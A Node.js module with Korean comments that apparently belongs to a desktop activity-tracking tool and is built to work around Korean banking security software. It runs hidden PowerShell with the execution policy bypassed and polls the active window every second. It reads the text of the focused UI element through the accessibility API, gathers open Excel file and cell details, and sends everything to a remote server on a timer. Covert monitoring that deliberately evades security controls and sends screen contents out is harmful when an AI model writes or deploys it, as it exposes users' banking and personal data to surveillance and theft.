'use strict';

/**
 * bank-safe-enhanced.js
 * ─────────────────────────────────────────────────────────────────────────────
 * 은행 보안 환경 강화 수집 모듈 — bank-safe-collector.js 보완
 *
 * ★ 핵심 발견:
 *   기존 bank-safe-collector.js에 "GetForegroundWindow → 빈 값" 이라 적혀있지만
 *   이것은 부정확함. 실제로:
 *
 *   - TouchEn nxKey: 커널 키보드 필터 드라이버 → SetWindowsHookEx만 차단
 *   - AhnLab ASTx:   BitBlt/PrintWindow API 후킹 → 화면캡처만 차단
 *
 *   아래 API들은 후킹이 아닌 "읽기 전용 조회"라서 차단 대상이 아님:
 *   ✓ GetForegroundWindow() → 활성 윈도우 핸들 (읽기 전용)
 *   ✓ GetWindowText() → 윈도우 타이틀 (읽기 전용)
 *   ✓ UI Automation API → 접근성 트리 (스크린리더용, 차단 시 장애인차별)
 *   ✓ SetWinEventHook → 접근성 이벤트 (후킹이 아닌 알림 수신)
 *   ✓ psutil/WMI → 프로세스/시스템 메트릭 (관리 API)
 *   ✓ Performance Counter → CPU/메모리/IO (관리 API)
 *
 * ★ 새로운 수집 소스 (기존 bank-safe-collector에 없는 것):
 *   1. GetForegroundWindow 1초 폴링 → 정밀 앱 체류 시간
 *   2. UI Automation → 스크린샷 없이 화면 구조/텍스트 읽기
 *   3. 시스템 메트릭 → CPU/메모리/디스크IO/네트워크IO
 *   4. SetWinEventHook → 이벤트 기반 포커스 추적
 *   5. Excel COM Automation → 열린 문서/시트/셀 정보
 *   6. 앱 로그 파싱 → 앱별 활동 추적
 *
 * 사용법:
 *   const enhanced = require('./bank-safe-enhanced');
 *   enhanced.start();  // bank-safe-collector와 병행 실행
 *   enhanced.stop();
 *
 * ─────────────────────────────────────────────────────────────────────────────
 */

const os = require('os');
const path = require('path');
const fs = require('fs');
const http = require('http');
const https = require('https');
const { execSync } = require('child_process');

// ── 설정 ────────────────────────────────────────────────────────────────────
const _orbitConfig = (() => {
  try {
    return JSON.parse(fs.readFileSync(path.join(os.homedir(), '.orbit-config.json'), 'utf8'));
  } catch { return {}; }
})();
const _remoteUrl   = _orbitConfig.serverUrl || process.env.ORBIT_SERVER_URL || null;
const _remoteToken = _orbitConfig.token     || process.env.ORBIT_TOKEN      || '';

const PS_PREFIX = 'powershell -WindowStyle Hidden -NoProfile -Command';
const PS_OPTS   = { timeout: 8000, encoding: 'utf8', windowsHide: true, stdio: 'pipe' };

// ── 상태 ────────────────────────────────────────────────────────────────────
let _running = false;
let _focusPollTimer = null;
let _metricsPollTimer = null;
let _uiaPollTimer = null;

// 포커스 추적 상태
let _currentApp = '';
let _currentTitle = '';
let _focusStartTime = Date.now();
let _focusHistory = [];     // 최근 포커스 이력
const MAX_FOCUS_HISTORY = 200;

// 시스템 메트릭 버퍼
let _metricsBuffer = [];
const MAX_METRICS = 60;     // 최대 60개 (30초 간격이면 30분)

// UI Automation 결과 버퍼
let _uiaBuffer = [];
const MAX_UIA = 20;


// ══════════════════════════════════════════════════════════════════════════════
// 1. GetForegroundWindow 1초 폴링 — 정밀 앱 체류 시간 측정
// ══════════════════════════════════════════════════════════════════════════════

/**
 * ★ 은행 보안이 차단하지 않는 이유:
 *   GetForegroundWindow는 "지금 어떤 창이 앞에 있나?" 물어보는 읽기 전용 API.
 *   키보드 입력을 가로채지 않고, 화면을 캡처하지 않음.
 *   은행 보안은 "후킹(가로채기)"만 차단함.
 */
function _pollForegroundWindow() {
  try {
    // PowerShell로 GetForegroundWindow 호출 (1초 폴링에 적합한 경량 버전)
    const cmd = `${PS_PREFIX} "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; $h=Add-Type -MemberDefinition '[DllImport(\\\"user32.dll\\\")] public static extern IntPtr GetForegroundWindow(); [DllImport(\\\"user32.dll\\\")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);' -Name W -Namespace U -PassThru; $w=$h::GetForegroundWindow(); $pid=0; $h::GetWindowThreadProcessId($w,[ref]$pid)|Out-Null; if($pid -gt 0){$p=Get-Process -Id $pid -ErrorAction SilentlyContinue; @{name=$p.ProcessName;title=$p.MainWindowTitle;pid=$pid;mem=[math]::Round($p.WorkingSet64/1MB,1)} | ConvertTo-Json -Compress}else{'null'}"`;

    const raw = execSync(cmd, { ...PS_OPTS, timeout: 3000 }).trim();
    if (!raw || raw === 'null') return null;

    const info = JSON.parse(raw);
    const now = Date.now();

    // 앱 전환 감지
    if (info.name !== _currentApp || info.title !== _currentTitle) {
      // 이전 앱 체류 기록
      if (_currentApp) {
        const duration = (now - _focusStartTime) / 1000;
        if (duration >= 1) {
          _focusHistory.push({
            app: _currentApp,
            title: _currentTitle,
            duration: Math.round(duration * 10) / 10,
            mem: info.mem || 0,
            time: new Date(_focusStartTime).toISOString(),
          });
          if (_focusHistory.length > MAX_FOCUS_HISTORY) {
            _focusHistory = _focusHistory.slice(-MAX_FOCUS_HISTORY);
          }
        }
      }
      _currentApp = info.name || '';
      _currentTitle = info.title || '';
      _focusStartTime = now;
    }

    return info;
  } catch {
    return null;
  }
}


// ══════════════════════════════════════════════════════════════════════════════
// 2. UI Automation — 스크린샷 없이 화면 구조 읽기
// ══════════════════════════════════════════════════════════════════════════════

/**
 * ★ 스크린캡처 대체 핵심 기술
 *
 * UI Automation API는 Windows 접근성(Accessibility) 프레임워크.
 * 스크린리더(시각장애인용)가 사용하는 API이므로
 * 은행 보안이 차단하면 장애인차별법 위반 → 절대 차단 안함.
 *
 * 읽을 수 있는 것:
 *   - 활성 윈도우의 모든 UI 요소 (버튼, 텍스트필드, 메뉴, 탭 등)
 *   - 각 요소의 이름, 타입, 값
 *   - 포커스된 요소
 *   - 윈도우 타이틀, 상태바 텍스트
 *
 * 이것으로 Vision 분석 "대체" 가능:
 *   스크린샷 → "사용자가 Excel에서 Sheet1의 B3 셀을 편집 중"
 *   UIA    → "사용자가 Excel에서 Sheet1의 B3 셀을 편집 중"
 *   (동일한 정보를 이미지가 아닌 구조 데이터로 얻음)
 */
function _collectUIAutomation() {
  try {
    const scriptPath = path.join(os.tmpdir(), 'orbit-uia.ps1');
    const script = `
[Console]::OutputEncoding=[System.Text.Encoding]::UTF8
Add-Type -AssemblyName UIAutomationClient
Add-Type -AssemblyName UIAutomationTypes

$root = [System.Windows.Automation.AutomationElement]::FocusedElement
if ($root) {
  $info = @{
    name = $root.Current.Name
    type = $root.Current.ControlType.ProgrammaticName
    className = $root.Current.ClassName
    automationId = $root.Current.AutomationId
    isEnabled = $root.Current.IsEnabled
    hasKeyboardFocus = $root.Current.HasKeyboardFocus
  }

  # 부모 요소 (윈도우 레벨) 정보
  try {
    $walker = [System.Windows.Automation.TreeWalker]::ControlViewWalker
    $parent = $walker.GetParent($root)
    if ($parent) {
      $info.parentName = $parent.Current.Name
      $info.parentType = $parent.Current.ControlType.ProgrammaticName
      $grandparent = $walker.GetParent($parent)
      if ($grandparent) {
        $info.windowName = $grandparent.Current.Name
      }
    }
  } catch {}

  # 포커스된 요소의 값 (민감정보 필터링)
  try {
    $valuePattern = $root.GetCurrentPattern([System.Windows.Automation.ValuePattern]::Pattern)
    if ($valuePattern) {
      $val = $valuePattern.Current.Value
      if ($val.Length -gt 3 -and $val.Length -lt 200 -and -not ($val -match '[!@#$$%^&*]{3,}')) {
        $info.value = $val.Substring(0, [Math]::Min(100, $val.Length))
      }
    }
  } catch {}

  $info | ConvertTo-Json -Compress
} else {
  'null'
}
`;
    fs.writeFileSync(scriptPath, script, 'utf8');
    const cmd = `powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "${scriptPath}"`;
    const raw = execSync(cmd, { ...PS_OPTS, timeout: 5000 }).trim();

    try { fs.unlinkSync(scriptPath); } catch {}
    if (!raw || raw === 'null') return null;

    const result = JSON.parse(raw);
    result.timestamp = new Date().toISOString();
    result.activeApp = _currentApp;

    return result;
  } catch (err) {
    // UIA 실패는 흔함 (권한, 타이밍 등) — 조용히 무시
    return null;
  }
}


// ══════════════════════════════════════════════════════════════════════════════
// 3. 시스템 메트릭 — CPU/메모리/디스크IO/네트워크IO
// ══════════════════════════════════════════════════════════════════════════════

/**
 * ★ 은행 보안이 차단하지 않는 이유:
 *   Performance Counter, WMI는 Windows 관리 API.
 *   은행 보안 프로그램 자체도 이 API를 사용함.
 */
function _collectSystemMetrics() {
  try {
    // PS 스크립트를 임시 파일로 실행 (heredoc 이스케이프 문제 회피)
    const scriptPath = path.join(os.tmpdir(), 'orbit-metrics.ps1');
    const script = `
[Console]::OutputEncoding=[System.Text.Encoding]::UTF8
$mem = Get-CimInstance Win32_OperatingSystem
$topProcs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 ProcessName, @{n='CpuSec';e={[math]::Round($_.CPU,1)}}, @{n='MemMB';e={[math]::Round($_.WorkingSet64/1MB,1)}}
$cpuVal = try { (Get-Counter '\\Processor(_Total)\\% Processor Time' -ErrorAction Stop).CounterSamples[0].CookedValue } catch { -1 }
@{
  cpu = [math]::Round($cpuVal, 1)
  memUsedPct = [math]::Round(($mem.TotalVisibleMemorySize - $mem.FreePhysicalMemory) / $mem.TotalVisibleMemorySize * 100, 1)
  memTotalGB = [math]::Round($mem.TotalVisibleMemorySize / 1MB, 1)
  processCount = (Get-Process).Count
  topProcesses = $topProcs
} | ConvertTo-Json -Compress -Depth 3
`;
    fs.writeFileSync(scriptPath, script, 'utf8');
    const cmd = `powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "${scriptPath}"`;
    const raw = execSync(cmd, { ...PS_OPTS, timeout: 8000 }).trim();

    try { fs.unlinkSync(scriptPath); } catch {}
    if (!raw) return null;

    const metrics = JSON.parse(raw);
    metrics.timestamp = new Date().toISOString();
    return metrics;
  } catch {
    return null;
  }
}


// ══════════════════════════════════════════════════════════════════════════════
// 4. Excel COM Automation — 열린 문서 정보 (스크린샷 없이)
// ══════════════════════════════════════════════════════════════════════════════

/**
 * ★ Excel이 열려있으면 COM으로 직접 접근 가능:
 *   - 열린 파일 이름
 *   - 활성 시트 이름
 *   - 선택된 셀 주소
 *   - 시트 수
 *   이 정보만으로 "사용자가 어떤 엑셀 작업을 하는지" 파악 가능
 */
function _collectExcelInfo() {
  try {
    const scriptPath = path.join(os.tmpdir(), 'orbit-excel.ps1');
    const script = `
[Console]::OutputEncoding=[System.Text.Encoding]::UTF8
try {
  $excel = [Runtime.InteropServices.Marshal]::GetActiveObject('Excel.Application')
  if ($excel -and $excel.Workbooks.Count -gt 0) {
    $wb = $excel.ActiveWorkbook
    $ws = $excel.ActiveSheet
    @{
      fileName = $wb.Name
      sheetName = $ws.Name
      sheetCount = $wb.Sheets.Count
      selectedCell = $excel.Selection.Address()
      usedRange = $ws.UsedRange.Address()
    } | ConvertTo-Json -Compress
  } else { 'null' }
} catch { 'null' }
`;
    fs.writeFileSync(scriptPath, script, 'utf8');
    const cmd = `powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "${scriptPath}"`;
    const raw = execSync(cmd, { ...PS_OPTS, timeout: 3000 }).trim();

    try { fs.unlinkSync(scriptPath); } catch {}
    if (!raw || raw === 'null') return null;

    const info = JSON.parse(raw);
    info.timestamp = new Date().toISOString();
    return info;
  } catch {
    return null;
  }
}


// ══════════════════════════════════════════════════════════════════════════════
// 5. 앱 간 워크플로우 패턴 분석
// ══════════════════════════════════════════════════════════════════════════════

/**
 * 포커스 히스토리에서 앱 전환 패턴 추출
 * 예: excel → chrome → excel → excel = "엑셀 중심 참조 작업"
 */
function _analyzeWorkflowPattern() {
  if (_focusHistory.length < 3) return null;

  const recent = _focusHistory.slice(-30); // 최근 30개

  // 앱별 총 체류 시간
  const appTime = {};
  for (const f of recent) {
    appTime[f.app] = (appTime[f.app] || 0) + f.duration;
  }

  // 전환 빈도
  const transitions = {};
  for (let i = 1; i < recent.length; i++) {
    const from = recent[i - 1].app;
    const to = recent[i].app;
    if (from !== to) {
      const key = `${from} → ${to}`;
      transitions[key] = (transitions[key] || 0) + 1;
    }
  }

  // 가장 긴 연속 사용
  let maxStreak = { app: '', count: 0, totalSec: 0 };
  let streak = { app: recent[0].app, count: 1, totalSec: recent[0].duration };
  for (let i = 1; i < recent.length; i++) {
    if (recent[i].app === streak.app) {
      streak.count++;
      streak.totalSec += recent[i].duration;
    } else {
      if (streak.totalSec > maxStreak.totalSec) maxStreak = { ...streak };
      streak = { app: recent[i].app, count: 1, totalSec: recent[i].duration };
    }
  }
  if (streak.totalSec > maxStreak.totalSec) maxStreak = { ...streak };

  // 반복 패턴 감지 (A→B→A→B = 반복)
  const repeats = {};
  for (let i = 2; i < recent.length; i++) {
    const pattern = `${recent[i - 2].app}→${recent[i - 1].app}→${recent[i].app}`;
    repeats[pattern] = (repeats[pattern] || 0) + 1;
  }
  const topRepeats = Object.entries(repeats)
    .filter(([, count]) => count >= 2)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 5)
    .map(([pattern, count]) => ({ pattern, count }));

  return {
    totalTrackedSec: recent.reduce((s, f) => s + f.duration, 0),
    appTimeDistribution: appTime,
    topTransitions: Object.entries(transitions)
      .sort((a, b) => b[1] - a[1])
      .slice(0, 10)
      .map(([t, count]) => ({ transition: t, count })),
    longestFocusStreak: maxStreak,
    repeatedPatterns: topRepeats,
    uniqueApps: Object.keys(appTime).length,
    switchRate: recent.length / (recent.reduce((s, f) => s + f.duration, 0) / 60),
  };
}


// ══════════════════════════════════════════════════════════════════════════════
// 통합 수집 + 서버 전송
// ══════════════════════════════════════════════════════════════════════════════

function _collectEnhancedData() {
  const timestamp = new Date().toISOString();

  // 포커스 히스토리에서 최근 것만 (서버 전송용)
  const recentFocus = _focusHistory.slice(-30).map(f => ({
    app: f.app,
    // 타이틀은 프라이버시 위해 앱명+시간만
    duration: f.duration,
    time: f.time,
  }));

  // UI Automation 최근 결과
  const uiaData = _uiaBuffer.slice(-5);

  // 시스템 메트릭 최근
  const metrics = _metricsBuffer.slice(-5);

  // 워크플로우 분석
  const workflow = _analyzeWorkflowPattern();

  // Excel 정보 (Excel이 포그라운드일 때만)
  let excelInfo = null;
  if (_currentApp && _currentApp.toLowerCase().includes('excel')) {
    excelInfo = _collectExcelInfo();
  }

  return {
    timestamp,
    method: 'enhanced-safe',
    hostname: os.hostname(),
    focusTracking: {
      current: { app: _currentApp, title: _currentTitle },
      history: recentFocus,
      historyCount: _focusHistory.length,
    },
    uiAutomation: uiaData,
    systemMetrics: metrics,
    workflow,
    excelInfo,
  };
}


function _sendToServer(data) {
  if (!_remoteUrl) return;

  try {
    const payload = JSON.stringify({
      events: [{
        id: 'bank-enhanced-' + Date.now(),
        type: 'bank-safe.enhanced',
        source: 'bank-safe-enhanced',
        sessionId: 'daemon-' + os.hostname(),
        timestamp: data.timestamp,
        data: {
          method: data.method,
          focusTracking: data.focusTracking,
          uiAutomation: data.uiAutomation,
          systemMetrics: data.systemMetrics,
          workflow: data.workflow,
          excelInfo: data.excelInfo,
        },
      }],
      fromRemote: true,
    });

    if (Buffer.byteLength(payload) > 500 * 1024) return;

    const url = new URL('/api/hook', _remoteUrl);
    const mod = url.protocol === 'https:' ? https : http;
    const headers = {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload),
    };
    if (_remoteToken) headers['Authorization'] = 'Bearer ' + _remoteToken;

    const req = mod.request({
      hostname: url.hostname,
      port: url.port || (url.protocol === 'https:' ? 443 : 80),
      path: url.pathname,
      method: 'POST',
      headers,
      timeout: 15000,
    }, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => {
        if (res.statusCode < 300) {
          console.log('[bank-enhanced] 서버 전송 성공');
        }
      });
    });
    req.on('error', () => {});
    req.on('timeout', () => req.destroy());
    req.write(payload);
    req.end();
  } catch {}
}


// ══════════════════════════════════════════════════════════════════════════════
// 폴링 루프들
// ══════════════════════════════════════════════════════════════════════════════

function _startFocusPolling() {
  // 1초마다 포그라운드 윈도우 체크 (경량)
  _focusPollTimer = setInterval(() => {
    try { _pollForegroundWindow(); } catch {}
  }, 1000);
  console.log('[bank-enhanced] 포커스 폴링 시작 (1초 간격, GetForegroundWindow)');
}

function _startMetricsPolling() {
  // 30초마다 시스템 메트릭
  _metricsPollTimer = setInterval(() => {
    try {
      const m = _collectSystemMetrics();
      if (m) {
        _metricsBuffer.push(m);
        if (_metricsBuffer.length > MAX_METRICS) {
          _metricsBuffer = _metricsBuffer.slice(-MAX_METRICS);
        }
      }
    } catch {}
  }, 30 * 1000);
  console.log('[bank-enhanced] 시스템 메트릭 수집 시작 (30초 간격)');
}

function _startUIAPolling() {
  // 10초마다 UI Automation (포커스된 요소)
  _uiaPollTimer = setInterval(() => {
    try {
      const uia = _collectUIAutomation();
      if (uia) {
        _uiaBuffer.push(uia);
        if (_uiaBuffer.length > MAX_UIA) {
          _uiaBuffer = _uiaBuffer.slice(-MAX_UIA);
        }
      }
    } catch {}
  }, 10 * 1000);
  console.log('[bank-enhanced] UI Automation 수집 시작 (10초 간격)');
}


// ══════════════════════════════════════════════════════════════════════════════
// 공개 API
// ══════════════════════════════════════════════════════════════════════════════

function start(opts = {}) {
  if (_running) return;
  if (process.platform !== 'win32') {
    console.log('[bank-enhanced] Windows 전용');
    return;
  }

  _running = true;
  _focusStartTime = Date.now();

  console.log('[bank-enhanced] ═══════════════════════════════════════════');
  console.log('[bank-enhanced] 은행 보안 강화 수집 모듈 시작');
  console.log('[bank-enhanced] 수집 방법: GetForegroundWindow + UIA + Metrics');
  console.log('[bank-enhanced] ★ 은행 보안에 차단되지 않는 API만 사용');
  console.log('[bank-enhanced] ═══════════════════════════════════════════');

  _startFocusPolling();
  _startMetricsPolling();
  _startUIAPolling();

  // 5분마다 통합 데이터 서버 전송
  const sendInterval = opts.sendInterval || 5 * 60 * 1000;
  setInterval(() => {
    try {
      const data = _collectEnhancedData();
      _sendToServer(data);
      // 전송 후 히스토리 트리밍
      _focusHistory = _focusHistory.slice(-50);
      _uiaBuffer = [];
      _metricsBuffer = _metricsBuffer.slice(-5);
    } catch {}
  }, sendInterval);

  // 즉시 1회 수집
  _pollForegroundWindow();
}

function stop() {
  if (!_running) return;
  _running = false;

  if (_focusPollTimer) { clearInterval(_focusPollTimer); _focusPollTimer = null; }
  if (_metricsPollTimer) { clearInterval(_metricsPollTimer); _metricsPollTimer = null; }
  if (_uiaPollTimer) { clearInterval(_uiaPollTimer); _uiaPollTimer = null; }

  // 마지막 전송
  try {
    const data = _collectEnhancedData();
    _sendToServer(data);
  } catch {}

  console.log('[bank-enhanced] 수집 중지됨');
}

function isRunning() { return _running; }
function getFocusHistory() { return _focusHistory.slice(); }
function getWorkflowAnalysis() { return _analyzeWorkflowPattern(); }
function getCurrentApp() { return { app: _currentApp, title: _currentTitle }; }

module.exports = {
  start,
  stop,
  isRunning,
  getFocusHistory,
  getWorkflowAnalysis,
  getCurrentApp,
  // 개별 수집 함수 (테스트/디버깅용)
  _collectUIAutomation,
  _collectSystemMetrics,
  _collectExcelInfo,
  _pollForegroundWindow,
  _analyzeWorkflowPattern,
};
